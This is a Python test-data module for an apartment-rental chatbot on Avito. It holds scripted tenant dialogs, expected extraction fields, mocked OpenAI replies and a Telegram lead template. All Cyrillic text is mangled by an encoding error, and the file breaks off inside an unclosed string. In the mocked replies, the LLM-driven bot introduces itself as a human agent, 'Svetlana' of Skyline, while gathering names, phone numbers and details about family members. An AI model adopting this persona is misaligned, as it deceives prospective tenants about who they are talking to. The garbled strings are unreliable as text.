#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
–¢–µ—Å—Ç–æ–≤—ã–µ —Å—Ü–µ–Ω–∞—Ä–∏–∏ –∏ –¥–∞–Ω–Ω—ã–µ –¥–ª—è Avito Rental Bot
–°–æ–¥–µ—Ä–∂–∏—Ç —Ä–∞–∑–ª–∏—á–Ω—ã–µ –¥–∏–∞–ª–æ–≥–∏ –∏ —Å–∏—Ç—É–∞—Ü–∏–∏ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
"""

import time
from datetime import datetime

class TestScenarios:
    """–ö–ª–∞—Å—Å —Å —Ç–µ—Å—Ç–æ–≤—ã–º–∏ —Å—Ü–µ–Ω–∞—Ä–∏—è–º–∏ –¥–∏–∞–ª–æ–≥–æ–≤"""
    
    @staticmethod
    def get_complete_dialog_scenario():
        """–ü–æ–ª–Ω—ã–π —É—Å–ø–µ—à–Ω—ã–π –¥–∏–∞–ª–æ–≥ –æ—Ç –Ω–∞—á–∞–ª–∞ –¥–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è"""
        base_time = int(time.time())
        
        return {
            "name": "–ü–æ–ª–Ω—ã–π —É—Å–ø–µ—à–Ω—ã–π –¥–∏–∞–ª–æ–≥",
            "description": "–ö–ª–∏–µ–Ω—Ç –ø—Ä–æ—Ö–æ–¥–∏—Ç –≤—Å–µ —ç—Ç–∞–ø—ã –∏ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç –≤—Å—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é",
            "messages": [
                {
                    "id": 1,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 300,
                    "author_id": 12345,
                    "content": {"text": "–ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ, –∏–Ω—Ç–µ—Ä–µ—Å—É–µ—Ç –∫–≤–∞—Ä—Ç–∏—Ä–∞"}
                },
                {
                    "id": 2,
                    "direction": "out",
                    "type": "text", 
                    "created": base_time - 295,
                    "author_id": 0,
                    "content": {"text": "–ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ, –Ω–∞ —Å–≤—è–∑–∏ –°–≤–µ—Ç–ª–∞–Ω–∞, –ê–ù Skyline\n–†–∞—Å—Å–∫–∞–∂–∏—Ç–µ, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞, –∫—Ç–æ –ø—Ä–æ–∂–∏–≤–∞—Ç—å –ø–ª–∞–Ω–∏—Ä—É–µ—Ç"}
                },
                {
                    "id": 3,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 290,
                    "author_id": 12345,
                    "content": {"text": "–ë—É–¥—É –∂–∏—Ç—å —è –æ–¥–∏–Ω, –º—É–∂—á–∏–Ω–∞ 28 –ª–µ—Ç"}
                },
                {
                    "id": 4,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 285,
                    "author_id": 0,
                    "content": {"text": "–î–µ—Ç–∏ –ø–ª–∞–Ω–∏—Ä—É—é—Ç—Å—è?"}
                },
                {
                    "id": 5,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 280,
                    "author_id": 12345,
                    "content": {"text": "–ù–µ—Ç –¥–µ—Ç–µ–π"}
                },
                {
                    "id": 6,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 275,
                    "author_id": 0,
                    "content": {"text": "–ñ–∏–≤–æ—Ç–Ω—ã–µ –µ—Å—Ç—å?"}
                },
                {
                    "id": 7,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 270,
                    "author_id": 12345,
                    "content": {"text": "–ù–µ—Ç –∂–∏–≤–æ—Ç–Ω—ã—Ö"}
                },
                {
                    "id": 8,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 265,
                    "author_id": 0,
                    "content": {"text": "–û—Ç —Å–∫–æ–ª—å–∫–∏ –º–µ—Å—è—Ü–µ–≤ —Ä–∞—Å—Å–º–∞—Ç—Ä–∏–≤–∞–µ—Ç–µ –∞—Ä–µ–Ω–¥—É?"}
                },
                {
                    "id": 9,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 260,
                    "author_id": 12345,
                    "content": {"text": "–û—Ç 12 –º–µ—Å—è—Ü–µ–≤ –º–∏–Ω–∏–º—É–º"}
                },
                {
                    "id": 10,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 255,
                    "author_id": 0,
                    "content": {"text": "–ö–æ–≥–¥–∞ –ø–ª–∞–Ω–∏—Ä—É–µ—Ç–µ –∑–∞–µ–∑–∂–∞—Ç—å?"}
                },
                {
                    "id": 11,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 250,
                    "author_id": 12345,
                    "content": {"text": "–° 1 —Å–µ–Ω—Ç—è–±—Ä—è"}
                },
                {
                    "id": 12,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 245,
                    "author_id": 0,
                    "content": {"text": "–ö–∞–∫ –í–∞—Å –∑–æ–≤—É—Ç?"}
                },
                {
                    "id": 13,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 240,
                    "author_id": 12345,
                    "content": {"text": "–ê–ª–µ–∫—Å–µ–π"}
                },
                {
                    "id": 14,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 235,
                    "author_id": 0,
                    "content": {"text": "–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –¥–ª—è —Å–≤—è–∑–∏?"}
                },
                {
                    "id": 15,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 230,
                    "author_id": 12345,
                    "content": {"text": "+7 999 123 45 67"}
                }
            ],
            "expected_extraction": {
                "name": "–ê–ª–µ–∫—Å–µ–π",
                "phone": "+7 999 123 45 67",
                "residents_info": "–º—É–∂—á–∏–Ω–∞ 28 –ª–µ—Ç",
                "residents_count": 1,
                "residents_details": "–º—É–∂—á–∏–Ω–∞ 28 –ª–µ—Ç",
                "has_children": False,
                "children_details": None,
                "has_pets": False,
                "pets_details": None,
                "rental_period": "–æ—Ç 12 –º–µ—Å—è—Ü–µ–≤ –º–∏–Ω–∏–º—É–º",
                "move_in_deadline": "—Å 1 —Å–µ–Ω—Ç—è–±—Ä—è"
            }
        }
    
    @staticmethod
    def get_family_with_pets_scenario():
        """–°–µ–º—å—è —Å –¥–µ—Ç—å–º–∏ –∏ –∂–∏–≤–æ—Ç–Ω—ã–º–∏"""
        base_time = int(time.time())
        
        return {
            "name": "–°–µ–º—å—è —Å –¥–µ—Ç—å–º–∏ –∏ –∂–∏–≤–æ—Ç–Ω—ã–º–∏",
            "description": "–ë–æ–ª–µ–µ —Å–ª–æ–∂–Ω—ã–π —Å–ª—É—á–∞–π —Å —Å–µ–º—å–µ–π, –¥–µ—Ç—å–º–∏ –∏ –∂–∏–≤–æ—Ç–Ω—ã–º–∏",
            "messages": [
                {
                    "id": 1,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 200,
                    "author_id": 67890,
                    "content": {"text": "–î–æ–±—Ä—ã–π –¥–µ–Ω—å! –ú–æ–∂–µ–º –ª–∏ –º—ã –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å –∫–≤–∞—Ä—Ç–∏—Ä—É?"}
                },
                {
                    "id": 2,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 195,
                    "author_id": 0,
                    "content": {"text": "–ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ, –Ω–∞ —Å–≤—è–∑–∏ –°–≤–µ—Ç–ª–∞–Ω–∞, –ê–ù Skyline\n–†–∞—Å—Å–∫–∞–∂–∏—Ç–µ, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞, –∫—Ç–æ –ø—Ä–æ–∂–∏–≤–∞—Ç—å –ø–ª–∞–Ω–∏—Ä—É–µ—Ç"}
                },
                {
                    "id": 3,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 190,
                    "author_id": 67890,
                    "content": {"text": "–°–µ–º—å—è: —è, –º—É–∂ –∏ –¥–≤–æ–µ –¥–µ—Ç–µ–π"}
                },
                {
                    "id": 4,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 185,
                    "author_id": 0,
                    "content": {"text": "–†–∞—Å—Å–∫–∞–∂–∏—Ç–µ –ø–æ–¥—Ä–æ–±–Ω–µ–µ –ø—Ä–æ –¥–µ—Ç–µ–π"}
                },
                {
                    "id": 5,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 180,
                    "author_id": 67890,
                    "content": {"text": "–°—ã–Ω 8 –ª–µ—Ç –∏ –¥–æ—á–∫–∞ 5 –ª–µ—Ç"}
                },
                {
                    "id": 6,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 175,
                    "author_id": 0,
                    "content": {"text": "–ñ–∏–≤–æ—Ç–Ω—ã–µ –µ—Å—Ç—å?"}
                },
                {
                    "id": 7,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 170,
                    "author_id": 67890,
                    "content": {"text": "–î–∞, —É –Ω–∞—Å –∫–æ—Ç"}
                },
                {
                    "id": 8,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 165,
                    "author_id": 0,
                    "content": {"text": "–õ—é–±–ª—é –∂–∏–≤–æ—Ç–Ω—ã—Öü•∞ –û—Ç —Å–∫–æ–ª—å–∫–∏ –º–µ—Å—è—Ü–µ–≤ —Ä–∞—Å—Å–º–∞—Ç—Ä–∏–≤–∞–µ—Ç–µ –∞—Ä–µ–Ω–¥—É?"}
                },
                {
                    "id": 9,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 160,
                    "author_id": 67890,
                    "content": {"text": "–û—Ç 6 –º–µ—Å—è—Ü–µ–≤"}
                },
                {
                    "id": 10,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 50,
                    "author_id": 67890,
                    "content": {"text": "–° —Å–µ—Ä–µ–¥–∏–Ω—ã –∞–≤–≥—É—Å—Ç–∞ —Ö–æ—Ç–µ–ª–∏ –±—ã"}
                },
                {
                    "id": 11,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 30,
                    "author_id": 67890,
                    "content": {"text": "–ú–∞—Ä–∏–Ω–∞ –º–µ–Ω—è –∑–æ–≤—É—Ç, +7 926 555 77 88"}
                }
            ],
            "expected_extraction": {
                "name": "–ú–∞—Ä–∏–Ω–∞",
                "phone": "+7 926 555 77 88",
                "residents_info": "—Å–µ–º—å—è: –º—É–∂ –∏ –∂–µ–Ω–∞",
                "residents_count": 2,
                "residents_details": "—Å–µ–º—å—è: –º—É–∂ –∏ –∂–µ–Ω–∞",
                "has_children": True,
                "children_details": "—Å—ã–Ω 8 –ª–µ—Ç –∏ –¥–æ—á–∫–∞ 5 –ª–µ—Ç",
                "has_pets": True,
                "pets_details": "–∫–æ—Ç",
                "rental_period": "–æ—Ç 6 –º–µ—Å—è—Ü–µ–≤",
                "move_in_deadline": "—Å —Å–µ—Ä–µ–¥–∏–Ω—ã –∞–≤–≥—É—Å—Ç–∞"
            }
        }
    
    @staticmethod
    def get_incomplete_dialog_scenario():
        """–ù–µ–∑–∞–≤–µ—Ä—à–µ–Ω–Ω—ã–π –¥–∏–∞–ª–æ–≥"""
        base_time = int(time.time())
        
        return {
            "name": "–ù–µ–∑–∞–≤–µ—Ä—à–µ–Ω–Ω—ã–π –¥–∏–∞–ª–æ–≥",
            "description": "–ö–ª–∏–µ–Ω—Ç –Ω–µ –¥–∞–µ—Ç –ø–æ–ª–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é",
            "messages": [
                {
                    "id": 1,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 100,
                    "author_id": 11111,
                    "content": {"text": "–ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ, –∏–Ω—Ç–µ—Ä–µ—Å—É–µ—Ç –∫–≤–∞—Ä—Ç–∏—Ä–∞"}
                },
                {
                    "id": 2,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 95,
                    "author_id": 0,
                    "content": {"text": "–ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ, –Ω–∞ —Å–≤—è–∑–∏ –°–≤–µ—Ç–ª–∞–Ω–∞, –ê–ù Skyline\n–†–∞—Å—Å–∫–∞–∂–∏—Ç–µ, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞, –∫—Ç–æ –ø—Ä–æ–∂–∏–≤–∞—Ç—å –ø–ª–∞–Ω–∏—Ä—É–µ—Ç"}
                },
                {
                    "id": 3,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 90,
                    "author_id": 11111,
                    "content": {"text": "–ë—É–¥—É –∂–∏—Ç—å –æ–¥–∏–Ω"}
                },
                {
                    "id": 4,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 85,
                    "author_id": 0,
                    "content": {"text": "–ü–æ–¥—Å–∫–∞–∂–∏—Ç–µ –í–∞—à –≤–æ–∑—Ä–∞—Å—Ç"}
                },
                {
                    "id": 5,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 80,
                    "author_id": 11111,
                    "content": {"text": "30"}
                }
            ],
            "expected_stage": "residents",
            "should_followup": True
        }
    
    @staticmethod
    def get_difficult_client_scenario():
        """–°–ª–æ–∂–Ω—ã–π –∫–ª–∏–µ–Ω—Ç —Å –Ω–µ—Ç–æ—á–Ω—ã–º–∏ –æ—Ç–≤–µ—Ç–∞–º–∏"""
        base_time = int(time.time())
        
        return {
            "name": "–°–ª–æ–∂–Ω—ã–π –∫–ª–∏–µ–Ω—Ç",
            "description": "–ö–ª–∏–µ–Ω—Ç –¥–∞–µ—Ç –Ω–µ—Ç–æ—á–Ω—ã–µ –æ—Ç–≤–µ—Ç—ã, —Ç—Ä–µ–±—É–µ—Ç –ø–µ—Ä–µ—Å–ø—Ä–æ—Å–æ–≤",
            "messages": [
                {
                    "id": 1,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 150,
                    "author_id": 22222,
                    "content": {"text": "–ü—Ä–∏–≤–µ—Ç, –∫–≤–∞—Ä—Ç–∏—Ä–∞ —Å–≤–æ–±–æ–¥–Ω–∞?"}
                },
                {
                    "id": 2,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 145,
                    "author_id": 0,
                    "content": {"text": "–ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ, –Ω–∞ —Å–≤—è–∑–∏ –°–≤–µ—Ç–ª–∞–Ω–∞, –ê–ù Skyline\n–†–∞—Å—Å–∫–∞–∂–∏—Ç–µ, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞, –∫—Ç–æ –ø—Ä–æ–∂–∏–≤–∞—Ç—å –ø–ª–∞–Ω–∏—Ä—É–µ—Ç"}
                },
                {
                    "id": 3,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 140,
                    "author_id": 22222,
                    "content": {"text": "–°–µ–º—å—è"}
                },
                {
                    "id": 4,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 135,
                    "author_id": 0,
                    "content": {"text": "–ü–æ–¥—Å–∫–∞–∂–∏—Ç–µ –ø–æ–ª –∏ –≤–æ–∑—Ä–∞—Å—Ç –∫–∞–∂–¥–æ–≥–æ –≤–∑—Ä–æ—Å–ª–æ–≥–æ"}
                },
                {
                    "id": 5,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 130,
                    "author_id": 22222,
                    "content": {"text": "–ü–∞—Ä–∞ –º–æ–ª–æ–¥–∞—è"}
                },
                {
                    "id": 6,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 125,
                    "author_id": 0,
                    "content": {"text": "–ö–æ–Ω–∫—Ä–µ—Ç–Ω–µ–µ –ø–æ–∂–∞–ª—É–π—Å—Ç–∞ - —Å–∫–æ–ª—å–∫–æ –ª–µ—Ç –∫–∞–∂–¥–æ–º—É?"}
                },
                {
                    "id": 7,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 120,
                    "author_id": 22222,
                    "content": {"text": "–ú–Ω–µ 25, –∂–µ–Ω–µ 23"}
                },
                {
                    "id": 8,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 115,
                    "author_id": 0,
                    "content": {"text": "–î–µ—Ç–∏ –ø–ª–∞–Ω–∏—Ä—É—é—Ç—Å—è?"}
                },
                {
                    "id": 9,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 110,
                    "author_id": 22222,
                    "content": {"text": "–í–æ–∑–º–æ–∂–Ω–æ"}
                },
                {
                    "id": 10,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 105,
                    "author_id": 0,
                    "content": {"text": "–°–µ–π—á–∞—Å –µ—Å—Ç—å –¥–µ—Ç–∏?"}
                },
                {
                    "id": 11,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 100,
                    "author_id": 22222,
                    "content": {"text": "–ù–µ—Ç"}
                },
                {
                    "id": 12,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 95,
                    "author_id": 0,
                    "content": {"text": "–ñ–∏–≤–æ—Ç–Ω—ã–µ –µ—Å—Ç—å?"}
                },
                {
                    "id": 13,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 90,
                    "author_id": 22222,
                    "content": {"text": "–ù–µ—Ç"}
                },
                {
                    "id": 14,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 85,
                    "author_id": 0,
                    "content": {"text": "–û—Ç —Å–∫–æ–ª—å–∫–∏ –º–µ—Å—è—Ü–µ–≤ —Ä–∞—Å—Å–º–∞—Ç—Ä–∏–≤–∞–µ—Ç–µ –∞—Ä–µ–Ω–¥—É?"}
                },
                {
                    "id": 15,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 80,
                    "author_id": 22222,
                    "content": {"text": "–ù–∞–¥–æ–ª–≥–æ"}
                },
                {
                    "id": 16,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 75,
                    "author_id": 0,
                    "content": {"text": "–û—Ç —Å–∫–æ–ª—å–∫–∏ –º–µ—Å—è—Ü–µ–≤ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ?"}
                },
                {
                    "id": 17,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 70,
                    "author_id": 22222,
                    "content": {"text": "–û—Ç –≥–æ–¥–∞"}
                },
                {
                    "id": 18,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 20,
                    "author_id": 22222,
                    "content": {"text": "–° –æ–∫—Ç—è–±—Ä—è —Ö–æ—Ç–∏–º, –î–º–∏—Ç—Ä–∏–π, 89161234567"}
                }
            ],
            "expected_extraction": {
                "name": "–î–º–∏—Ç—Ä–∏–π",
                "phone": "89161234567",
                "residents_info": "–º—É–∂—á–∏–Ω–∞ 25 –ª–µ—Ç –∏ –∂–µ–Ω—â–∏–Ω–∞ 23 –≥–æ–¥–∞",
                "residents_count": 2,
                "has_children": False,
                "has_pets": False,
                "rental_period": "–æ—Ç –≥–æ–¥–∞",
                "move_in_deadline": "—Å –æ–∫—Ç—è–±—Ä—è"
            }
        }
    
    @staticmethod
    def get_system_message_scenario():
        """–°—Ü–µ–Ω–∞—Ä–∏–π —Å —Å–∏—Å—Ç–µ–º–Ω—ã–º–∏ —Å–æ–æ–±—â–µ–Ω–∏—è–º–∏"""
        base_time = int(time.time())
        
        return {
            "name": "–î–∏–∞–ª–æ–≥ —Å —Å–∏—Å—Ç–µ–º–Ω—ã–º–∏ —Å–æ–æ–±—â–µ–Ω–∏—è–º–∏",
            "description": "–î–∏–∞–ª–æ–≥ —Å–æ–¥–µ—Ä–∂–∏—Ç —Å–∏—Å—Ç–µ–º–Ω—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è, –∫–æ—Ç–æ—Ä—ã–µ –Ω—É–∂–Ω–æ –∏–≥–Ω–æ—Ä–∏—Ä–æ–≤–∞—Ç—å",
            "messages": [
                {
                    "id": 1,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 120,
                    "author_id": 33333,
                    "content": {"text": "–ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ"}
                },
                {
                    "id": 2,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 115,
                    "author_id": 0,  # –°–∏—Å—Ç–µ–º–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
                    "content": {"text": "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–æ–¥–∫–ª—é—á–∏–ª—Å—è –∫ —á–∞—Ç—É"}
                },
                {
                    "id": 3,
                    "direction": "out",
                    "type": "text",
                    "created": base_time - 110,
                    "author_id": 0,
                    "content": {"text": "–ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ, –Ω–∞ —Å–≤—è–∑–∏ –°–≤–µ—Ç–ª–∞–Ω–∞, –ê–ù Skyline"}
                },
                {
                    "id": 4,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 105,
                    "author_id": 0,  # –°–∏—Å—Ç–µ–º–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
                    "content": {"text": "–°–æ–æ–±—â–µ–Ω–∏–µ —É–¥–∞–ª–µ–Ω–æ"}
                },
                {
                    "id": 5,
                    "direction": "in",
                    "type": "text",
                    "created": base_time - 100,
                    "author_id": 33333,
                    "content": {"text": "–ë—É–¥—É –∂–∏—Ç—å –æ–¥–∏–Ω, –º—É–∂—á–∏–Ω–∞ 35 –ª–µ—Ç"}
                }
            ],
            "expected_behavior": "–°–∏—Å—Ç–µ–º–Ω—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è –∏–≥–Ω–æ—Ä–∏—Ä—É—é—Ç—Å—è"
        }
    
    @staticmethod
    def get_followup_scenario():
        """–°—Ü–µ–Ω–∞—Ä–∏–π –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è follow-up"""
        base_time = int(time.time()) - 7200  # 2 —á–∞—Å–∞ –Ω–∞–∑–∞–¥
        
        return {
            "name": "Follow-up —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ",
            "description": "–ö–ª–∏–µ–Ω—Ç –Ω–µ –æ—Ç–≤–µ—á–∞–µ—Ç, –¥–æ–ª–∂–µ–Ω –ø–æ–ª—É—á–∏—Ç—å follow-up —Å–æ–æ–±—â–µ–Ω–∏—è",
            "messages": [
                {
                    "id": 1,
                    "direction": "in",
                    "type": "text",
                    "created": base_time,
                    "author_id": 44444,
                    "content": {"text": "–ò–Ω—Ç–µ—Ä–µ—Å—É–µ—Ç –∫–≤–∞—Ä—Ç–∏—Ä–∞"}
                },
                {
                    "id": 2,
                    "direction": "out",
                    "type": "text",
                    "created": base_time + 5,
                    "author_id": 0,
                    "content": {"text": "–ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ, –Ω–∞ —Å–≤—è–∑–∏ –°–≤–µ—Ç–ª–∞–Ω–∞, –ê–ù Skyline\n–†–∞—Å—Å–∫–∞–∂–∏—Ç–µ, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞, –∫—Ç–æ –ø—Ä–æ–∂–∏–≤–∞—Ç—å –ø–ª–∞–Ω–∏—Ä—É–µ—Ç"}
                }
            ],
            "last_client_activity": base_time,
            "should_trigger_followup": True,
            "followup_intervals": ["2h", "16h", "2d", "4d"]
        }
    
    @staticmethod
    def get_edge_case_scenarios():
        """–ü–æ–≥—Ä–∞–Ω–∏—á–Ω—ã–µ —Å–ª—É—á–∞–∏"""
        return {
            "empty_messages": {
                "name": "–ü—É—Å—Ç—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è",
                "messages": [],
                "expected_behavior": "–ö–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ –ø—É—Å—Ç–æ–≥–æ —Å–ø–∏—Å–∫–∞"
            },
            "only_system_messages": {
                "name": "–¢–æ–ª—å–∫–æ —Å–∏—Å—Ç–µ–º–Ω—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è",
                "messages": [
                    {
                        "id": 1,
                        "direction": "in",
                        "type": "text",
                        "created": int(time.time()),
                        "author_id": 0,
                        "content": {"text": "–°–∏—Å—Ç–µ–º–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ"}
                    }
                ],
                "expected_behavior": "–ò–≥–Ω–æ—Ä–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π"
            },
            "malformed_messages": {
                "name": "–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è",
                "messages": [
                    {
                        "id": 1,
                        "direction": "in",
                        "type": "image",  # –ù–µ —Ç–µ–∫—Å—Ç
                        "created": int(time.time()),
                        "author_id": 12345
                    },
                    {
                        "id": 2,
                        "direction": "in",
                        "type": "text",
                        "created": int(time.time()),
                        "author_id": 12345,
                        "content": {}  # –ü—É—Å—Ç–æ–π –∫–æ–Ω—Ç–µ–Ω—Ç
                    }
                ],
                "expected_behavior": "–ò–≥–Ω–æ—Ä–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π"
            }
        }

class TestData:
    """–ö–ª–∞—Å—Å —Å —Ç–µ—Å—Ç–æ–≤—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏"""
    
    @staticmethod
    def get_mock_chat_data():
        """–ú–æ–∫–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ —á–∞—Ç–∞"""
        return {
            "id": "test_chat_12345",
            "context": {
                "value": {
                    "title": "2-–∫ –∫–≤–∞—Ä—Ç–∏—Ä–∞, 60 –º¬≤, 5/9 —ç—Ç.",
                    "price_string": "45 000 ‚ÇΩ/–º–µ—Å.",
                    "location": {
                        "title": "–ú–æ—Å–∫–≤–∞, –º. –°–æ–∫–æ–ª—å–Ω–∏–∫–∏",
                        "lat": 55.7558,
                        "lon": 37.6176
                    },
                    "url": "https://www.avito.ru/moskva/kvartiry/test-123456"
                }
            }
        }
    
    @staticmethod
    def get_mock_openai_responses():
        """–ú–æ–∫–æ–≤—ã–µ –æ—Ç–≤–µ—Ç—ã –æ—Ç OpenAI"""
        return {
            "greeting_response": "–ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ, –Ω–∞ —Å–≤—è–∑–∏ –°–≤–µ—Ç–ª–∞–Ω–∞, –ê–ù Skyline\n–†–∞—Å—Å–∫–∞–∂–∏—Ç–µ, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞, –∫—Ç–æ –ø—Ä–æ–∂–∏–≤–∞—Ç—å –ø–ª–∞–Ω–∏—Ä—É–µ—Ç",
            "residents_question": "–ü–æ–¥—Å–∫–∞–∂–∏—Ç–µ –ø–æ–ª –∏ –≤–æ–∑—Ä–∞—Å—Ç –∫–∞–∂–¥–æ–≥–æ –≤–∑—Ä–æ—Å–ª–æ–≥–æ",
            "children_question": "–î–µ—Ç–∏ –ø–ª–∞–Ω–∏—Ä—É—é—Ç—Å—è?",
            "pets_question": "–ñ–∏–≤–æ—Ç–Ω—ã–µ –µ—Å—Ç—å?",
            "period_question": "–û—Ç —Å–∫–æ–ª—å–∫–∏ –º–µ—Å—è—Ü–µ–≤ —Ä–∞—Å—Å–º–∞—Ç—Ä–∏–≤–∞–µ—Ç–µ –∞—Ä–µ–Ω–¥—É?",
            "date_question": "–ö–æ–≥–¥–∞ –ø–ª–∞–Ω–∏—Ä—É–µ—Ç–µ –∑–∞–µ–∑–∂–∞—Ç—å?",
            "name_question": "–ö–∞–∫ –í–∞—Å –∑–æ–≤—É—Ç?",
            "phone_question": "–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –¥–ª—è —Å–≤—è–∑–∏?",
            "completion_response": "–û—Ç–ª–∏—á–Ω–æ, –æ–±—Å—É–¥–∏–º –≤–∞—Å —Å —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–∏—Ü–µ–π, –µ—Å–ª–∏ –æ–¥–æ–±—Ä–∏—Ç, —Ç–æ —Å–≤—è–∂–µ–º—Å—è —Å –í–∞–º–∏ü§ù [COMPLETE]",
            "extraction_result": {
                "name": "–¢–µ—Å—Ç–æ–≤—ã–π –ö–ª–∏–µ–Ω—Ç",
                "phone": "+7 999 123 45 67",
                "residents_info": "–º—É–∂—á–∏–Ω–∞ 30 –ª–µ—Ç",
                "residents_count": 1,
                "residents_details": "–º—É–∂—á–∏–Ω–∞ 30 –ª–µ—Ç",
                "has_children": False,
                "children_details": None,
                "has_pets": False,
                "pets_details": None,
                "rental_period": "–æ—Ç 12 –º–µ—Å—è—Ü–µ–≤",
                "move_in_deadline": "—Å 1 —Å–µ–Ω—Ç—è–±—Ä—è"
            }
        }
    
    @staticmethod
    def get_mock_telegram_message():
        """–ú–æ–∫–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è Telegram"""
        return """üè† –ù–û–í–ê–Ø –ó–ê–Ø–í–ö–ê –ù–ê –ê–†–ï–ù–î–£

üìã –û–±—ä—è–≤–ª–µ–Ω–∏–µ: 2-–∫ –∫–≤–∞—Ä—Ç–∏—Ä–∞, 60 –º¬≤, 5/9 —ç—Ç.
üìç –ê–¥—Ä–µ—Å: –ú–æ—Å–∫–≤–∞, –º. –°–æ–∫–æ–ª—å–Ω–∏–∫–∏

üë§ –ò–º—è: –¢–µ—Å—Ç–æ–≤—ã–π –ö–ª–∏–µ–Ω—Ç
üìû –¢–µ–ª–µ—Ñ–æ–Ω: +7 999 123 45 67
